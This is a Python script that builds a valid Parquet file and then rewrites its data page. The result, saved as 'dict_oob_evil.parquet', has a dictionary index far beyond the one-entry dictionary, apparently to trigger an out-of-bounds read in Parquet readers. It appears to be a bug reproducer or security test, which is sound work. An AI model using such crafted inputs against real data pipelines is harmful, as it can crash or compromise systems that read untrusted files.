import os
import pyarrow as pa, pyarrow.parquet as pq, struct, sys
_D = os.path.dirname(os.path.abspath(__file__))

OUT_BASE = os.path.join(_D, "dict_oob_base.parquet")
OUT_EVIL = os.path.join(_D, "dict_oob_evil.parquet")

# 4 rows, one distinct value -> dictionary-encoded (dictCount=1), uncompressed, v1 page, no stats.
# REQUIRED column (nullable=False) so the data page has NO definition-levels section and
# valbuf[0] is the dictionary-index bit-width byte the reader reads.
schema = pa.schema([pa.field("v", pa.int32(), nullable=False)])
t = pa.table({"v": [7, 7, 7, 7]}, schema=schema)
pq.write_table(t, OUT_BASE, use_dictionary=True, compression="none",
               data_page_version="1.0", write_statistics=False, version="1.0")
b = bytearray(open(OUT_BASE, "rb").read())

# ---- minimal Thrift compact reader over the page headers ----
def uvarint(buf, p):
    shift = 0; res = 0
    while True:
        by = buf[p]; p += 1
        res |= (by & 0x7f) << shift
        if not (by & 0x80): break
        shift += 7
    return res, p

def zigzag(u):
    return (u >> 1) ^ -(u & 1)

# parse one compact struct starting at p (after any field-header context reset).
# returns (end_offset, fields) where fields = list of (fid, ctype, val_start, val_end)
def parse_struct(buf, p):
    fid = 0
    fields = []
    while True:
        fh = buf[p]
        if fh == 0x00:          # struct STOP
            return p + 1, fields
        delta = (fh >> 4) & 0x0f
        ctype = fh & 0x0f
        p += 1
        if delta == 0:
            zz, p = uvarint(buf, p); fid = zigzag(zz)
        else:
            fid += delta
        vs = p
        if ctype in (1, 2):     # bool true/false: value in header, no bytes
            ve = p
        elif ctype == 3:        # byte
            ve = p + 1; p = ve
        elif ctype in (4, 5, 6):  # i16/i32/i64: zigzag varint
            _, p = uvarint(buf, p); ve = p
        elif ctype == 7:        # double
            ve = p + 8; p = ve
        elif ctype == 8:        # binary
            ln, p = uvarint(buf, p); ve = p + ln; p = ve
        elif ctype == 12:       # struct (recurse)
            p, _ = parse_struct(buf, p); ve = p
        else:
            raise SystemExit(f"unhandled compact type {ctype} at {p}")
        fields.append((fid, ctype, vs, ve))

# dict page header at offset 4
dh_end, dfields = parse_struct(b, 4)
dsz = {f: (vs, ve) for (f, ct, vs, ve) in dfields}
# field 3 = compressed_page_size of dict page
vs, ve = dsz[3]; comp_dict, _ = uvarint(b, vs)
comp_dict = zigzag(comp_dict)
data_hdr_off = dh_end + comp_dict
print(f"dict hdr [4,{dh_end}) comp_dict={comp_dict} -> data page hdr at {data_hdr_off}")

# data page header
ph_end, pfields = parse_struct(b, data_hdr_off)
pf = {f: (ct, vs, ve) for (f, ct, vs, ve) in pfields}
ct2, us_s, us_e = pf[2]      # uncompressed_page_size
ct3, cs_s, cs_e = pf[3]      # compressed_page_size
old_comp, _ = uvarint(b, cs_s); old_comp = zigzag(old_comp)
print(f"data hdr [{data_hdr_off},{ph_end}) old uncomp/comp sizes fields present; old_comp={old_comp}")
print("data page header fields (fid,ctype):", [(f, ct) for (f, ct, _, _) in pfields])

# crafted payload: [bit_width=32][bitpacked run header=3 (1 group)][value0=0x80000000 LE, 7x0]
payload = bytes([32]) + bytes([3]) + struct.pack("<I", 0x80000000) + struct.pack("<I", 0) * 7
newlen = len(payload)   # 34

def put_zzvarint_1byte(buf, pos, val):
    zz = (val << 1) ^ (val >> 31) if val < 0 else (val << 1)
    assert zz < 0x80, f"size {val} does not fit one varint byte"
    buf[pos] = zz

# both size fields must currently be single-byte varints (they are: small) and 34 fits one byte
assert us_e - us_s == 1 and cs_e - cs_s == 1, (us_s, us_e, cs_s, cs_e)
newb = bytearray(b)
put_zzvarint_1byte(newb, us_s, newlen)
put_zzvarint_1byte(newb, cs_s, newlen)

# splice: keep [0, ph_end) (magic+dictpage+patched datapage-header),
# then crafted payload, then original footer region [old data payload end : end]
old_payload_start = ph_end
old_payload_end = ph_end + old_comp
evil = bytes(newb[:ph_end]) + payload + bytes(newb[old_payload_end:])
open(OUT_EVIL, "wb").write(evil)
print(f"wrote {OUT_EVIL} ({len(evil)} bytes); replaced payload [{old_payload_start},{old_payload_end}) len {old_comp} -> {newlen}")
print("evil magic tail:", evil[:4], evil[-4:])
